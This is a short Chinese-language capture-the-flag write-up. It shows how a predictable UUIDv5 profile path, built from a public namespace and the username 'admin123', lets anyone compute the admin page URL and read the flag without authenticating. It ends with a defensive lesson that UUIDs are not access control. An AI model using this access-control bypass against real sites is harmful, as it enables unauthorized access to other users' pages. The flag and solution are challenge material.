# Passwordless

## 题目简述

站点用 UUIDv5 为用户名生成个人页面路径，并禁止直接提交 `admin123`。UUIDv5 是给定命名空间和名称的确定性哈希，因此管理员路径可在本地计算。

## 解题过程

源码公开了命名空间：

```text
13371337-1337-1337-1337-133713371337
```

计算管理员 UUID：

```python
import uuid

namespace = uuid.UUID("13371337-1337-1337-1337-133713371337")
print(uuid.uuid5(namespace, "admin123"))
```

结果为：

```text
3c68e6cc-15a7-59d4-823c-e7563bbb326c
```

直接访问：

```text
/3c68e6cc-15a7-59d4-823c-e7563bbb326c
```

即可得到：

```text
n00bz{1337-13371337-1337-133713371337-1337}
```

## 方法总结

UUIDv5 提供稳定标识，不提供访问控制或不可预测性。只要命名空间和用户名已知，任何人都能离线计算同一 UUID；敏感页面仍需真正的认证授权。
